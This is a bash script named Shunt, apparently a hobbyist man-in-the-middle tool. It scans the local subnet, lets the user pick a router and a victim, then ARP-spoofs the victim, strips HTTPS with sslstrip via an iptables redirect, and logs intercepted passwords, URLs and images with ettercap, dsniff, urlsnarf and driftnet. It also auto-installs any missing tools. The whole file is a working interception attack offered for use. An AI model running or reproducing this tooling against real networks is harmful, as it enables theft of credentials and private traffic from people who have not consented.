#!/bin/bash

#	 dP"8 888                         d8   
#	C8b Y 888 ee  8888 8888 888 8e   d88   
#	 Y8b  888 88b 8888 8888 888 88b d88888 
#	b Y8D 888 888 Y888 888P 888 888  888   
#	8edP  888 888  "88 88"  888 888  888 

#***************************
#      Shunt 1.0 Beta
#~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
# Name: Shunt
# Type: MITM
# Dev: Shell
# Ver: 1.0 Beta
# Date: 11/23/2018
# Coder: KURO-CODE
#
#~~~~~~~~~~~~~~~~~~~~~~~~~~
#	Requirement
#~~~~~~~~~~~~~~~~~~~~~~~~~~
#
# + Arpspoof
# + Ettercap
# + Sslstrip
# + Urlsnarf
# + Driftnet
# + Dsniff
# + Netsniff-ng
# + Tcpdump
#

#**** Shunt version ****
VERSION="1.0"

#**** Display ****
DISPLAY_Def="-geometry 80x10-0-0"
DISPLAY_NetSniff="-geometry 80x10-0-170"
DISPLAY_TcpDump="-geometry 60x10-600-0"
DISPLAY_Url="-geometry 80x10-0-340"

#**** Color ****
CL="\033[0;7m"
W="\033[1;37m"
GR="\033[0;37m"
R="\033[1;31m"
G="\033[1;32m"
Y="\033[1;33m"
B="\033[1;34m"
M="\033[1;35m"
EC="\033[0m"

LOGO() {
	echo -e " dP\"8 888                         d8   
C8b Y 888 ee  8888 8888 888 8e   d88   
 Y8b  888 88b 8888 8888 888 88b d88888 
b Y8D 888 888 Y888 888P 888 888  888   
8edP  888 888  \"88 88\"  888 888  888 \n "
} 

Main() {
	Place="MAIN"
	clear
	LOGO
	dd=`ifconfig |grep 'wl' |awk '{print $1}'`
	IX=`echo $dd |sed 's/ /\n/g' |cut -f1 -d :`
	echo -e "   ~ Main Menu ~\n  ---------------\n"
	echo $dd |sed 's/ /\n/g' |cut -f1 -d : |nl
	echo
	read -p " Device: " Ifaces
	Iface=`echo $dd |sed 's/ //g' |cut -f${Ifaces} -d :`
	I="$Iface"
	II=`$IX |grep $I`
	if [ "$I" != "$II" ]; then
        clear
        echo -e "OK"
	else
        clear
        LOGO
        echo -e "Error, device not found..."
        sleep 4
        Main
	fi	
	clear
	LOGO
	echo -e "$W [$G""X$W]$GR Scan, please wait..."
}

function SCANN() {
	You=`ifconfig $Iface |grep 'inet ' |awk '{print $2}'`
	s=`nmap $You/24 |grep report | awk '{print $6}'`
	SN=`echo $s |sed 's/(//g' |sed 's/)//g' > scan.txt`
}

Set_Attack() {
	Place="Set_Attack"
	clear
	LOGO
	echo $s |sed 's/ /\n/g' | sed 's/(//g' |sed 's/)//g' |nl
	read -p "Router: " Route
	Router=`echo $s |sed 's/)/:/g' |sed 's/(//g' | sed 's/ //g' |cut -f${Route} -d :`
	clear
	LOGO
	READ=`cat scan.txt`
	echo $READ |sed 's/ /\n/g' |sed 's/(//g' |sed 's/)//g' |nl	
	read -p "Target: " Targets
	Target=`echo $s |sed 's/)/:/g' |sed 's/(//g' | sed 's/ //g' |cut -f${Targets} -d :`
	clear
	echo -e "Iface: $Iface\nRouter: $Router\nTarget: $Target"
	read
	Forward
	Iptables
	Attack
	Kill
}

function Forward() {
	echo 1 > /proc/sys/net/ipv4/ip_forward
}

function Attack() {
#	xterm -T "Mitm" -e "ettercap -T -w dump -M ARP /$Target//$Router/" &
	xterm -T "SslStrip" -geometry \$DISPLAY_Def -e "sslstrip -w secret.txt -a -l 12000 -f" &
	xterm -T "ArpSpoof" -geometry \$DISPLAY_Def -e "arpspoof -i $Iface -t $Target $Router" &
	xterm -T "Mitm" -geometry \$DISPLAY_Def -e "ettercap -T -q -i $Iface >> pass.txt" &
	xterm -T "Driftnet" -geometry \$DISPLAY_Def -e "driftnet -i $Iface" &
	xterm -T "Dsniff" -geometry \$DISPLAY_Def -e "dsniff -i $Iface" &
	xterm -T "netsniff" -geometry 80x10-0-170 -e "netsniff-ng --in $Iface" &
	xterm -T "Tcpdump" -geometry 60x10-600-0 -e "tcpdump -i $Iface |grep 'IP' |awk '{print \$2, \$3}'" &
	xterm -T "Url" -geometry 80x10-0-340 -e "urlsnarf -i $Iface |awk '{print \$7}'" &
	sleep 4
	xterm -T "Password" -geometry \$ISPLAY_Def -e "tail -f pass.txt |grep '\(INFO\|CONTENT\)'" &
}

function Iptables() {
	iptables -t nat -A PREROUTING -p TCP --destination-port 80 -j REDIRECT --to-port 12000
}

Kill() {
	Place="Kill"
	clear
	LOGO
	echo -e " ~ Attack Control ~\n--------------------\n\n\t1 kill\n"
	read -p " Option: " KILL
	case $KILL in
		1) Kill_Attack; Clean_TMP; Main;;
		*) echo -e "ERROR"; Kill;;
	esac
}

function Kill_Attack() {
	clear
	LOGO
	echo -e "$W[$R+$W]$GR Kill ArpSpoof."
	pkill arpspoof
	echo -e "$W[$R+$W]$GR Kill Ettercap."
	pkill ettercap
	echo -e "$W[$R+$W]$GR Kill Sslstrip."
	pkill sslstrip
	echo -e "$W[$R+$W]$GR Kill Urlsnarf."
	pkill urlsnarf
	echo -e "$W[$R+$W]$GR Kill Driftnet."
	pkill driftnet
	echo -e "$W[$R+$W]$GR Kill Dsniff."
	pkill dsniff
	echo -e "$W[$R+$W]$GR Kill Netsniff."
	pkill netsniff-ng
	echo -e "$W[$R+$W]$GR Kill Tcpdump."
	pkill tcpdump
	echo -e "$W[$R+$W]$GR Kill Tail."
	pkill tail
	echo -e "$W[$R+$W]$GR Kill Xterm."
	pkill xterm
	echo -e "$W[$R+$W]$GR Kill Forwarding."
	echo 0 > /proc/sys/net/ipv4/ip_forward
	echo -e "$W[$R+$W]$GR Clean Iptables."
	iptables -F
	iptables -X
}

function Check_Dep() {
	Place="Check_Dep"
	clear
	LOGO
	echo -ne "Nmap...."
	if ! hash nmap 2>/dev/null; then
		TooL1=" nmap"
		ETooL1=" Nmap"
		echo $TooL1 >> Add.txt
		echo -e "Not installed [x]"
		sleep 0.25
	else
		echo -e "[installed]"
	fi
	echo -ne "Arpspoof...."
	if ! hash arpspoof 2>/dev/null; then
		TooL2=" dsniff"
		ETooL2=" Arpspoof"
		echo $TooL2 >> Add.txt
		echo -e "Not installed [x]"
		sleep 0.25
	else
		echo -e "[installed]"
	fi
	sleep 0.25
	echo -ne "Ettercap...."
	if ! hash ettercap 2>/dev/null; then
		TooL3=" ettercap-text-only"
		ETooL3=" Ettercap"
		echo $TooL3 >> Add.txt
		echo -e "Not installed [x]"
		sleep 0.25
	else
		echo -e "[installed]"
	fi
	sleep 0.25
	echo -ne "Sslstrip...."
	if ! hash sslstrip 2>/dev/null; then
		TooL4=" sslstrip"
		ETooL4=" Sslstrip"
		echo $TooL4 >> Add.txt
		echo -e "Not installed [x]"
		sleep 0.25
	else
		echo -e "[installed]"
	fi
	sleep 0.25
	echo -ne "Urlsnarf...."
	if ! hash urlsnarf 2>/dev/null; then
		TooL5=" dsniff"
		ETooL5=" Urlsnarf"
		echo $TooL5 >> Add.txt
		echo -e "Not installed [x]"
		sleep 0.25
	else
		echo -e "[installed]"
	fi
	sleep 0.25
	echo -ne "Driftnet...."
	if ! hash driftnet 2>/dev/null; then
		TooL6=" driftnet"
		ETooL6=" Driftnet"
		echo $TooL6 >> Add.txt
		echo -e "Not installed [x]"
		sleep 0.25
	else
		echo -e "[installed]"
	fi
	sleep 0.25
	echo -ne "Dsniff......"
	if ! hash dsniff 2>/dev/null; then
		TooL7=" dsniff"
		ETooL7=" Dsniff"
		echo $TooL7 >> Add.txt
		echo -e "Not installed [x]"
		sleep 0.25
	else
		echo -e "[installed]"
	fi
	sleep 0.25
	echo -ne "Netsniff...."
	if ! hash netsniff-ng 2>/dev/null; then
		TooL8=" netsniff-ng"
		ETooL8=" Netsniff-ng"
		echo $TooL8 >> Add.txt
		echo -e "Not installed [x]"
		sleep 0.25
	else
		echo -e "[installed]"
	fi
	sleep 0.25
	echo -ne "Tcpdump....."
	if ! hash tcpdump 2>/dev/null; then
		TooL9=" tcpdump"
		ETooL9=" Tcpdump"
		echo $TooL9 >> Add.txt
		echo -e "Not installed [x]"
		sleep 0.25
	else
		echo -e "[installed]"
	fi
	if [ ! -f "Add.txt" ]; then
		echo -e "Not exist"
	else
		sleep 2
		clear
		LOGO
		echo -e " ~ Install Tools ~\n-------------------${R}"
		ToolList="$ETooL1$ETooL2$ETooL3$ETooL4$ETooL5$ETooL6$ETooL7$ETooL8$ETooL9"
		ToolS=`cat Add.txt`
		echo -e "$ToolList${W}" |sed 's/ /\n/g' |nl
		sleep 0.5
		echo -e "-->> Installation, please Wait..."
		sleep 3
		apt install $ToolS -y &
		rm -f Add.txt
		sleep 2
		Check_Dep
	fi
}

#~~~~ INFO ~~~~
function inf {
	Place="Info_Menu"
	clear
	LOGO
	echo
	echo -e " 	         $MENU_info
	  $B""o$W------------------------$B+
	  $W|$CL$G Name:....Shunt      $EC$W|
	  $W|$CL$G Dev:.....Shell         $EC$W|
	  $W|$CL$G Ver:.....$VERSION           $EC$W|
	  $W|$CL$G Date:....11/23/2018    $EC$W|
	  $W|$CL$G Coder:...Kuro-code     $EC$W|
	  $W|$CL$G Info:....Mitm tool $EC$W|
	  $B""o$W------------------------$B""o$W
     [$Y¡$W] Press$Y Enter$W, return main menu [$Y¡$W]$EC 	"
	read pause
	main
}

#**** Check Root ****
function check_root_perm() {
	clear
	LOGO
	user=$(whoami)
	if [ "$user" = "root" ]; then
  		echo -e "\n$W [$G""X$W]$GR...$G""Y$W""ou are $G""Root$W!"
  		sleep 1.2
  		Main
		SCANN
		Set_Attack
	else
		echo -e "\n$W [$R""X$W]$GR...$R""Y$W""ou are not $R""Root$W!\n\n $G""U$W""se:$Y sudo ./Shunt.sh$EC"
 		sleep 3
    	echo -e "\n$W [$R""X$W]$GR...$R""C$W""lose" 
    	sleep 1
    	EXITMODE
	fi
}

#~~~~ CLEAN TMP ~~~~
function Clean_TMP() {
	echo -e "\n$W[$G+$W]$GR Clean temporary files"
	rm -f scan.txt
	rm -f secret.txt
	sleep 0.2
}

#~~~~ Exit ~~~~
function EXITMODE {
	clear
	LOGO
	echo
	echo -e "\n	$CL Thanks for use Shunt $EC"
	sleep 2.5
	clear
	exit
}

#~~~~ Hard Exit ~~~~
function cap_traps() {
	case $Place in
		"MAIN") clear; EXITMODE;;
		"Set_Attack") clear; Clean_TMP; EXITMODE;;
		"Info_Menu") EXITMODE;;
		"Kill") clear; Clean_TMP; EXITMODE;;
		"Check_Dep") clear; rm -f Add.txt; EXITMODE;;
	esac 
}

for x in SIGINT SIGHUP INT SIGTSTP; do
	trap_cmd="trap \"cap_traps $x\" \"$x\""
	eval "$trap_cmd"
done

Check_Dep
check_root_perm


